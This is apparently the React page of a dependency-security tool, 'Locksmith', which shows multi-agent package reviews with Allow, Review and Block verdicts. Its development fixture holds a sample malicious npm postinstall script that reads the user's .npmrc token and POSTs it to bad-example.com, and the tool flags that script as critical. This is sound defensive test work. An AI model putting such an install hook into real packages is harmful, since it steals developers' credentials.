"use client";

import { useEffect, useRef, useState } from "react";
import Link from "next/link";
import RepoSearch from "../components/RepoSearch";
import "./review.css";

const agents = [
  { n: "1", icon: "▱", name: "Baseline", title: "Compares current dependencies with prior scans and lists which packages need fresh inspection." },
  { n: "2", icon: "□", name: "Manifest", title: "Checks package metadata, scripts, entrypoints, dependency jumps, and purpose mismatch." },
  { n: "3", icon: "</>", name: "Static", title: "Scans source files for suspicious code patterns and exact file lines." },
  { n: "4", icon: "△", name: "Behavior", title: "Explains likely install/runtime behavior from retrieved files." },
  { n: "5", icon: "?", name: "Skeptic", title: "Challenges weak evidence and false positives before a block decision." },
  { n: "6", icon: "J", name: "Judge", title: "Combines all evidence into Allow, Review, or Block with the smallest fix." },
] as const;

type Verdict = "Allow" | "Review" | "Block";
type Finding = { role:string; summary:string; evidence:string[]; verdict:Verdict; confidence:number };
type RoleStatus = "queued"|"running"|"done"|"failed";
type SuspiciousLine = { filePath:string; startLine:number; endLine?:number; severity:"low"|"medium"|"high"|"critical"; sourceAgent:string; reviewedBy?:string; reason:string; rule?:string };
type PackageFile = { path:string; reason:string; content:string; contentTruncated?:boolean; displayedBytes?:number; originalBytes?:number };
type PackageEvidence = { name:string; version:string; packageManager?:"npm"|"pypi"; dependencyType:string; scanStatus?:"new"|"reused"|"changed"|"unscanned"; previousReviewId?:string; evidenceId?:string; evidenceSource?:"global-cache"|"workspace-cache"|"fresh-scan"|"none"; artifactKey?:string; fileCount:number; files:string[]; inspectedFiles:PackageFile[]; suspiciousLines?:SuspiciousLine[]; status:Verdict; reason:string; evidence?:string[] };
type ReviewResult = { reviewId:string; dependencyStateId:string; source:string; files:string[]; packages:PackageEvidence[]; packageCount:number; inspectedPackageCount:number; packageSummary:string; findings:Finding[]; verdict:Verdict; remediation:string; mode:string; model:string };
type ReviewJob = {
  reviewId:string;
  status:"queued"|"retrieving-packages"|"running"|"complete"|"failed";
  currentRole?:string;
  currentRoles?:string[];
  completedRoles:string[];
  roleStatus?:Record<string,RoleStatus>;
  roleErrors?:Record<string,string>;
  packages:PackageEvidence[];
  findings:Finding[];
  result?:ReviewResult;
  error?:string;
};

export default function ReviewPage() {
  const [repo, setRepo] = useState("");
  const [phase, setPhase] = useState<"input"|"audit"|"report">("input");
  const [job, setJob] = useState<ReviewJob|null>(null);
  const [error, setError] = useState("");
  const [selectedPackageKey, setSelectedPackageKey] = useState("");
  const [selectedFilePath, setSelectedFilePath] = useState("");
  const poll = useRef<ReturnType<typeof setInterval>|null>(null);
  const autoStarted = useRef(false);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("fixture") === "1" && process.env.NODE_ENV !== "production") {
      setRepo("fixture://locksmith-redesign");
      setJob(fixtureJob());
      setPhase("report");
      return;
    }
    const imported = params.get("repo");
    const branch = params.get("branch") || undefined;
    if (!imported?.startsWith("https://github.com/")) return;
    setRepo(imported);
    if (autoStarted.current) return;
    autoStarted.current = true;
    void runReview({ repo: imported, branch });
  }, []);

  useEffect(() => () => { if (poll.current) clearInterval(poll.current); }, []);

  async function loadJob(reviewId:string) {
    const response = await fetch(`/api/review/${reviewId}`, { cache:"no-store" });
    const data = await response.json();
    if (!response.ok) throw new Error(data.error || "Review status failed");
    setJob(data);
    if (data.status === "complete") {
      if (poll.current) clearInterval(poll.current);
      setPhase("report");
    }
    if (data.status === "failed") {
      if (poll.current) clearInterval(poll.current);
      setError(data.error || "Review failed");
      setPhase("input");
    }
  }

  async function runReview(payload:{ repo?:string; branch?:string } = { repo }) {
    if (poll.current) clearInterval(poll.current);
    if (payload.repo) setRepo(payload.repo);
    setError("");
    setJob(null);
    setPhase("audit");
    try {
      const response = await fetch("/api/review", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload) });
      const data = await response.json();
      if (!response.ok) throw new Error(data.error || "Review failed");
      if (!data.reviewId) throw new Error("Review did not start. Try again.");
      await loadJob(data.reviewId);
      poll.current = setInterval(() => void loadJob(data.reviewId).catch(cause => {
        if (poll.current) clearInterval(poll.current);
        setError(cause instanceof Error ? cause.message : "Review status failed");
        setPhase("input");
      }), 1000);
    } catch (cause) {
      setError(cause instanceof Error ? cause.message : "Review failed");
      setPhase("input");
    }
  }

  const result = job?.result;
  const findings = job?.findings || result?.findings || [];
  const packages = result?.packages || job?.packages || [];
  const verdict = result?.verdict || "Review";
  const completed = new Set(job?.completedRoles || findings.map(finding => finding.role));
  const selectedPackage = packages.find(pkg => keyFor(pkg) === selectedPackageKey) || packages[0];
  const selectedFile = selectedPackage?.inspectedFiles.find(file => file.path === selectedFilePath) || selectedPackage?.inspectedFiles[0];
  const suspiciousCount = packages.reduce((sum, pkg) => sum + (pkg.suspiciousLines?.length || 0), 0);
  const verdictCounts = { allow: packages.filter(pkg => pkg.status === "Allow").length, review: packages.filter(pkg => pkg.status === "Review").length, block: packages.filter(pkg => pkg.status === "Block").length };

  useEffect(() => {
    if (!packages.length) return;
    if (!selectedPackage || !packages.some(pkg => keyFor(pkg) === selectedPackageKey)) setSelectedPackageKey(keyFor(packages[0]));
  }, [packages, selectedPackage, selectedPackageKey]);

  useEffect(() => {
    if (!selectedPackage) return;
    if (!selectedFile || !selectedPackage.inspectedFiles.some(file => file.path === selectedFilePath)) setSelectedFilePath(selectedPackage.inspectedFiles[0]?.path || "");
  }, [selectedPackage, selectedFile, selectedFilePath]);

  return <main className="review-page">
    {phase === "input" ? <section className="review-start">
      <p className="eyebrow">Workspace review / Qwen live analysis</p>
      <h1>Review a dependency state.</h1>
      <p>Locksmith retrieves real dependency files, sends them through six specialist Qwen agents, and saves the result locally.</p>
      <RepoSearch id="review-repo" initialRepo={repo} variant="review" onScan={runReview} />
      {error ? <p role="alert" style={{color:"var(--red)",fontFamily:"var(--mono)",fontSize:14}}>{error}</p> : null}
    </section> : null}

    {phase === "audit" ? <section className="audit-screen" aria-live="polite">
      <div className="audit-head"><div><p className="eyebrow">Live dependency review</p><h1>Building the case.</h1></div><strong>{findings.length.toString().padStart(2,"0")} / 06</strong></div>
      <div className="audit-repo"><i /> Reviewing <code>{repo}</code></div>
      {job?.status === "retrieving-packages" || packages.length ? <section className="package-panel">
        <h2>Retrieved packages</h2>
        <div className="package-grid">{packages.length ? packages.map(pkg => <PackageCard pkg={pkg} key={`${pkg.name}@${pkg.version}`} />) : <p>Fetching package artifacts...</p>}</div>
      </section> : null}
      <ol>{agents.map(agent => {
        const finding = findings.find(item => item.role === agent.name);
        const status = finding ? "done" : job?.currentRole === agent.name ? "active" : "waiting";
        return <li className={status} key={agent.name}>
          <span>{agent.n}</span><b>{agent.name}</b>
          <p>{finding?.summary || (status === "active" ? `Running ${agent.name.toLowerCase()} analysis...` : "Waiting for prior evidence")}</p>
          <em>{finding ? finding.verdict : status === "active" ? "Inspecting" : "Queued"}</em>
        </li>;
      })}</ol>
    </section> : null}

    {phase === "report" && result ? <section className="review-shell" aria-live="polite">
      <header className="review-topbar">
        <div><p className="eyebrow">Dependency state <code>{result.dependencyStateId}</code></p><h1 className={`verdict-${verdict.toLowerCase()}`}>{verdict}</h1></div>
        <dl>
          <div><dt>Packages</dt><dd>{packages.length}</dd></div>
          <div><dt>Suspicious</dt><dd>{suspiciousCount}</dd></div>
          <div><dt>Allow</dt><dd>{verdictCounts.allow}</dd></div>
          <div><dt>Review</dt><dd>{verdictCounts.review}</dd></div>
          <div><dt>Block</dt><dd>{verdictCounts.block}</dd></div>
        </dl>
      </header>

      <section className="review-grid">
        <aside className="package-list" aria-label="Packages">
          <h2>Packages</h2>
          {packages.map(pkg => {
            const active = keyFor(pkg) === keyFor(selectedPackage);
            return <button className={`package-row status-${pkg.status.toLowerCase()} ${active ? "selected" : ""}`} key={keyFor(pkg)} onClick={() => { setSelectedPackageKey(keyFor(pkg)); setSelectedFilePath(pkg.inspectedFiles[0]?.path || ""); }}>
              <span><strong>{pkg.name}</strong><code>{pkg.version}</code></span>
              <small>{label(pkg.scanStatus || "new")} · {label(pkg.evidenceSource || "fresh-scan")}</small>
              <em>{pkg.fileCount} files · {pkg.suspiciousLines?.length || 0} suspicious</em>
              <b>{pkg.status}</b>
            </button>;
          })}
        </aside>

        <section className="file-viewer" aria-label="Package files">
          {selectedPackage ? <>
            <header>
              <div><h2>{selectedPackage.name}@{selectedPackage.version}</h2><p>{selectedPackage.reason}</p></div>
              <b className={`verdict-${selectedPackage.status.toLowerCase()}`}>{selectedPackage.status}</b>
            </header>
            <dl className="package-facts">
              <div><dt>Scan status</dt><dd>{label(selectedPackage.scanStatus || "new")}</dd></div>
              <div><dt>Evidence source</dt><dd>{label(selectedPackage.evidenceSource || "fresh-scan")}</dd></div>
              <div><dt>Global Analysis</dt><dd>{selectedPackage.evidenceId || selectedPackage.artifactKey || "fresh package evidence"}</dd></div>
              <div><dt>Your Workspace</dt><dd>{selectedPackage.previousReviewId ? `prior review ${selectedPackage.previousReviewId}` : "approval still required"}</dd></div>
            </dl>
            <div className="file-layout">
              <nav className="file-list" aria-label="Files">
                {selectedPackage.files.map(path => {
                  const inspected = selectedPackage.inspectedFiles.some(file => file.path === path);
                  const count = selectedPackage.suspiciousLines?.filter(line => line.filePath === path).length || 0;
                  return <button className={path === selectedFile?.path ? "selected" : ""} key={path} onClick={() => setSelectedFilePath(path)} disabled={!inspected}>
                    <span>{path}</span><em>{inspected ? "inspected" : "listed"}{count ? ` · ${count}` : ""}</em>
                  </button>;
                })}
              </nav>
              <CodeViewer file={selectedFile} findings={selectedPackage.suspiciousLines || []} />
            </div>
          </> : <p>No packages found.</p>}
        </section>

        <aside className="agent-panel" aria-label="Agents">
          <h2>Agents</h2>
          {agents.map(agent => {
            const finding = findings.find(item => item.role === agent.name);
            const state = job?.roleStatus?.[agent.name] || (finding ? "done" : job?.currentRoles?.includes(agent.name) || job?.currentRole === agent.name ? "running" : completed.has(agent.name) ? "done" : "queued");
            return <article className={`agent-row agent-${state}`} key={agent.name} title={agent.title}>
              <span>{agent.icon}</span><div><strong>{agent.name}</strong><p>{job?.roleErrors?.[agent.name] || finding?.summary || (state === "running" ? "Inspecting..." : "Queued")}</p>{finding?.evidence?.length ? <small>{finding.evidence.slice(0, 2).join(" · ")}</small> : null}</div><b>{finding?.verdict || state}</b>
            </article>;
          })}
          <div className="remediation"><span>Remediation</span><p>{result.remediation}</p></div>
          <Link href="/history">View history</Link>
        </aside>
      </section>
    </section> : null}
  </main>;
}

function keyFor(pkg?:PackageEvidence) {
  return pkg ? `${pkg.name}@${pkg.version}` : "";
}

function label(value:string) {
  return value.replaceAll("-", " ");
}

function CodeViewer({ file, findings }:{ file?:PackageFile; findings:SuspiciousLine[] }) {
  if (!file) return <div className="code-empty">Select an inspected file.</div>;
  const byLine = new Map<number,SuspiciousLine[]>();
  for (const finding of findings.filter(item => item.filePath === file.path)) {
    for (let line = finding.startLine; line <= (finding.endLine || finding.startLine); line++) byLine.set(line, [...(byLine.get(line) || []), finding]);
  }
  return <div className="code-pane">
    <div className="code-meta"><strong>{file.path}</strong>{file.contentTruncated ? <span>Showing first {Math.ceil((file.displayedBytes || file.content.length) / 1024)} KB of {Math.ceil((file.originalBytes || file.content.length) / 1024)} KB</span> : <span>{file.reason}</span>}</div>
    <pre>{file.content.split(/\r?\n/).map((line,index) => {
      const number = index + 1;
      const hits = byLine.get(number) || [];
      return <code className={hits.length ? "code-line suspicious" : "code-line"} key={number}>
        <span>{number}</span><mark title={hits.map(hit => hit.reason).join(" ")}>{line || " "}</mark>
      </code>;
    })}</pre>
    {findings.filter(item => item.filePath === file.path).length ? <ul className="line-reasons">{findings.filter(item => item.filePath === file.path).map(item => <li key={`${item.filePath}:${item.startLine}:${item.rule}`}><b>Line {item.startLine}</b> <em>{item.sourceAgent} · {item.severity}{item.rule ? ` · ${item.rule}` : ""}</em> {item.reason}</li>)}</ul> : null}
  </div>;
}

function fixtureJob(): ReviewJob {
  const suspicious = {
    name: "fake-logger",
    version: "1.3.0",
    packageManager: "npm" as const,
    dependencyType: "dependencies",
    scanStatus: "new" as const,
    evidenceSource: "fresh-scan" as const,
    artifactKey: "npm:fake-logger@1.3.0:sha512-fixture",
    fileCount: 4,
    files: ["package/package.json", "package/scripts/postinstall.js", "package/index.js", "package/README.md"],
    inspectedFiles: [{
      path: "package/scripts/postinstall.js",
      reason: "suspicious static pattern",
      contentTruncated: true,
      displayedBytes: 260,
      originalBytes: 24000,
      content: "const fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst npmrc = path.join(os.homedir(), \".npmrc\");\nconst token = fs.readFileSync(npmrc, \"utf8\");\n\nfetch(\"https://bad-example.com/collect\", {\n  method: \"POST\",\n  body: token\n});",
    }],
    suspiciousLines: [
      { filePath: "package/scripts/postinstall.js", startLine: 5, severity: "critical" as const, sourceAgent: "Static", reason: "Static Agent: references npm credentials.", rule: ".npmrc" },
      { filePath: "package/scripts/postinstall.js", startLine: 5, severity: "high" as const, sourceAgent: "Static", reason: "Static Agent: accesses the user home directory.", rule: "os.homedir" },
      { filePath: "package/scripts/postinstall.js", startLine: 6, severity: "high" as const, sourceAgent: "Static", reason: "Static Agent: reads local files.", rule: "fs.readFile" },
      { filePath: "package/scripts/postinstall.js", startLine: 8, severity: "medium" as const, sourceAgent: "Static", reason: "Static Agent: contains outbound URL.", rule: "url" },
    ],
    status: "Block" as const,
    reason: "Install script reads npm credentials and sends data to an external URL.",
    evidence: ["package/scripts/postinstall.js line 8"],
  };
  const reused = {
    name: "next",
    version: "15.3.4",
    packageManager: "npm" as const,
    dependencyType: "dependencies",
    scanStatus: "reused" as const,
    evidenceSource: "global-cache" as const,
    evidenceId: "ev_next_1534",
    previousReviewId: "rev_previous",
    artifactKey: "npm:next@15.3.4:sha512-fixture",
    fileCount: 2,
    files: ["package/package.json", "package/dist/index.js"],
    inspectedFiles: [{ path: "package/package.json", reason: "package manifest", content: "{\"name\":\"next\"}" }],
    suspiciousLines: [],
    status: "Allow" as const,
    reason: "Package evidence reused from global cache. Workspace approval still checked separately.",
    evidence: [],
  };
  const findings = agents.map(agent => ({
    role: agent.name,
    verdict: agent.name === "Judge" ? "Block" as const : "Review" as const,
    summary: agent.name === "Static" ? "Found credential file access and outbound upload." : `${agent.name} checked package evidence.`,
    evidence: agent.name === "Static" ? ["package/scripts/postinstall.js line 8"] : [`${agent.name} evidence`],
    confidence: 0.8,
  }));
  const result: ReviewResult = {
    reviewId: "rev_fixture",
    dependencyStateId: "state_fixture",
    source: "fixture://locksmith-redesign",
    files: ["package.json", "package-lock.json"],
    packages: [suspicious, reused],
    packageCount: 2,
    inspectedPackageCount: 2,
    packageSummary: "2 packages reviewed: 1 allow, 0 review, 1 block.",
    findings,
    verdict: "Block",
    remediation: "Remove fake-logger, rollback the lockfile, or pin the previous approved version.",
    mode: "qwen",
    model: "fixture",
  };
  return {
    reviewId: "rev_fixture",
    status: "complete",
    currentRoles: [],
    completedRoles: agents.map(agent => agent.name),
    roleStatus: Object.fromEntries(agents.map(agent => [agent.name, "done"])) as Record<string, RoleStatus>,
    packages: result.packages,
    findings,
    result,
  };
}

function PackageCard({ pkg }:{ pkg:PackageEvidence }) {
  return <article className={`package-card status-${pkg.status.toLowerCase()}`}>
    <header><div><strong>{pkg.name}</strong><code>{pkg.version}</code></div><b>{pkg.status}</b></header>
    <p>{pkg.reason}</p>
    <dl><div><dt>Type</dt><dd>{pkg.dependencyType}</dd></div><div><dt>Files</dt><dd>{pkg.fileCount}</dd></div><div><dt>Inspected</dt><dd>{pkg.inspectedFiles.map(file => file.path).join(" · ") || "None"}</dd></div></dl>
    {pkg.evidence?.length ? <small>{pkg.evidence.join(" · ")}</small> : null}
    <details><summary>All internal files</summary><ol>{pkg.files.map(file => <li key={file}>{file}</li>)}</ol></details>
  </article>;
}
